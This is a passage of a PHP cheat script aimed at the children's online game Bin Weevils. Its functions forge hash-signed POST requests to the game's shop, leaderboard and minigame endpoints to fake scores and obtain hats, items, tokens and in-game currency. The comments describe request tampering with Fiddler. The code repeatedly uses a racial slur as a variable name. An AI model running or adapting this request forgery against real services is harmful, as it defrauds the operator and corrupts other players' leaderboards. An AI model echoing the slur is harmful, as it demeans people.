		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&timer=".$timer."&def=".$def."&idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print ("hash is ".$hash);
		}
		
	    function getHat() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/shop/buyHat.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$idx = 12; 
		$id = 220802067; 
		$colour = "-100,-100,40";
		$voucher = -1;
		$hash = o2_genhash($idx.$id.$colour.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer=".$timer."&idx=".$idx."&id=".$id."&colour=".$colour."&voucher=".$voucher);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	    
	    function hasuserplayed() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/game/has-the-user-played?rndVar=0.614110788796097");
		curl_setopt($curl, CURLOPT_POST, true);
		$gameID = 20; // works only for tycoons sucks but ok.
		$st = 1276772; // works just put timer and idx and hash ;P on fidd
		$hash = o2_genhash($gameID.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash".$hash."&st=".$st."&gameID=".$gameID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print ("hash is ".$hash);
	    }
	    
	    function shopBuyTokenItem() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/shop/buyTokenItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = 2136968; //first version second underneath also check file shopbuytoken.php
		$idx = 222035631; // better version.
		$itemID = 3479;
		$tokens = 10; // works.
		$hash = o2_genhash($timer.$itemID.$tokens.$idx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&timer=".$timer."&hash=".$hash."&tokens=".$tokens."&itemID=".$itemID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
	    }
	    
	    function buyTokenItem() {##game stuff
		$timer = 2136968;
		$idx = 222035631; //
		$itemID = "3477";// works just put timer and idx and hash ;P on fidd
		$tokens = "10";
		$hash = o2_genhash($idx.$itemID.$tokens.$timer);
		print ("hash is ".$hash);
	    }
	    
	    function hagglehua() {##
		$gardenitems = 0;
		$timer = 989051;
		$items = "523109936,523109934,523109933,523109931,523109930,523109928,523109926,523109923,523109922,523109921";
		$hash = o2_genhash($gardenitems.$items.$timer);
		print ("hash is ".$hash);
		}
		
		function submithashscore() {##
		$timer = 659098;
		$score = 300;
		$playerIdx = 222035631;
		$gameId = 2; //works
		$hash = o2_genhash($gameId.$playerIdx.$score.$timer);
		print ("hash is ".$hash);
		}
		
		function addPicToCamera() {## 
		$picHash = '9446faef70228061aa6035b31748d823'; //
		$size = '4'; //it works but you need the right hash id not the one from cloudfare9292/2kakak.jpg
		$timer = 484240; //#leave the same //use this too 82b07cfad7c5df7227455dcde3561024 you get different ones each user d214da69c497a964f9fa6107c1e65d2c // you get the hash and then change it with hash= and change timer and id dont change picHash. Also erase the response body. and then execute with fiddler
		$userIDX = 220802067;
		$hash = o2_genhash($picHash.$size.$timer.$userIDX);
		print ("hash is ".$hash);
		}
		
	    function submitSingleScore() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/leaderboards/singlePlayerGame.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 74499; #idx of the weevil u palying the game on // fixed :P
		$gameID = 12; #score
		$hash = o2_genhash($idx.$gameID);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&idx=".$idx."&gameID=".$gameID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	    
	    function buytoeknashscore() {##
		$itemID = 3700;
		$idx = 222035631;
		$timer = 317685;
		$tokens = 10; //works
		$hash = o2_genhash($idx.$itemID.$timer.$tokens);
		print ("hash is ".$hash);
		}
		
		function shopbuy2token() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/shop/buyTokenItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 222035631; // double copy real version is on the file.
		$timer = 317685;
		$tokens = 10;
		$hash = o2_genhash($idx.$itemID.$timer.$tokens);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&itemID=".$itemID."&hash=".$hash."&timer=".$timer."&tokens=".$tokens);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
		}
		
	    function gettHat() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/shop/buyHat.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$idx = 12; 
		$id = 220802067;   //
		$colour = "-100,-100,40";
		$voucher = -1;
		$hash = o2_genhash($idx.$id.$colour.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer=".$timer."&idx=".$idx."&id=".$id."&colour=".$colour."&voucher=".$voucher);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	    
	    function buyhat() {##  // CAN CHANGE 0,0,0 COLOUR IN APPAREL AND CAN ALSO GET ANY LVLHAT.
	    $idx = 222036308;
	    $colour = "0,0,0"; // cant change colour :(
	    $voucher = -1; // for each id on a specific acc has a different timer but would work for any clr and i think only 0,0,0 would work...
	    $id = 96; // correct the hash order. // the shittiest weirdest api it dont let you change clr, timer. or idk
	    $timer = 1044471; // part of the coding, finished on the file. //75701//
	    $hash = o2_genhash($colour.$voucher.$idx.$timer.$id); // FINALLY DONE IT XD but useless.. 
	    print ("hash is ".$hash);
	    }
	    
	    function getuid() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/magazines/read/getIssueForDisplay.php?rndVar=0.17379224579781294");
		curl_setopt($curl, CURLOPT_POST, true);
		$uid = 3900; // scroll up for more info.
		$hash = o2_genhash($uid);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "uid=".$uid);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	    function buyfood() {##
	    $st = 1568498;
	    $type = "bunion_rings"; // ice_cream
	    $cost = 25; // fixed :') // 1;
	    $energyValue = 45; // works for 1 mulch and energy value 100 ;p // 100
	    $hash = o2_genhash($cost.$energyValue.$type.$st);
	    print ("hash is ".$hash);
	    }
	    
	    function getmessageid() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/php2/loginMessages/getMessage.php?rndVar=0.562498826533556");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = 9787; // timer 9787 gives binpet message.
		$hash = o2_genhash($timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("hash is ".$hash);
	    }
	    
	    function weevilstats2() {##
	    $key = 0;
	    $st = 9624; // needs to be logged on bw
	    $idx = 211411385;
	    $hash = o2_genhash($idx.$key.$st);
	    print ("hash is ".$hash);
	    }
	    
	    function brainstrain1() {##
	    $levels = "0|2,1|0,3|6,4|0,5|4,7|2,8|2,9|3,10|0,11|2"; //http://prntscr.com/btkzvs // http://prntscr.com/btkzyp
	    $score = 5000;
	    $st = 172210; // fixed.
	    $hash = o2_genhash($score.$levels.$st);
	    print ("hash is ".$hash);
	    }
	    
	    function brainstrain() {##game stuff
		$curl = curl_init("http://lb.binweevils.com/game/brain-submit?rndVar=0.35762571915984154");
		curl_setopt($curl, CURLOPT_POST, true);
		$levels = "0|2,1|0,3|6,4|0,5|4,7|2,8|2,9|3,10|0,11|2";
		$score = 3000;
		$st = 122110;; // made it work ;p
		$hash = o2_genhash($score.$levels.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&levels=".$levels."&score=".$score."&st=".$st);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	    }
	    
	    function itemxp() {
		$curl = curl_init("http://lb.binweevils.com/shop/buyitem");	
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
		$timer = rand(10000,90000);
		$id = 77; // voip made this with adrians php i think.
		#$id = rand(2400,2500);
		$shop = 'furniture';
		$clr = '0';
		$user = "Yikes"; //hash=797dbe469f5805b94a9c1b4e29767a31&st=82521&id=57&itemColour=0%2C0%2C100&shop=furniture
		$hash = o2_genhash($id.$shop.$clr.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&st=".$timer."&id=".$id."&itemColour=".$clr."&shop=".$shop);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;	
		print '<h2> Item generated was: '.$id.'';
	    }
	    
	    function trialmulch() {
		$curl = curl_init("http://lb.binweevils.com/game/submit-trial");	
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
		$st = rand(10000,100000);
		$time = rand(62100,92100); // 62100 = 69 mulch
		$trackID = 3; // works
		$hash = o2_genhash($trackID.$time.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&st=".$st."&time=".$time."&trackID=".$trackID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;	
	    }
	    
	    
?>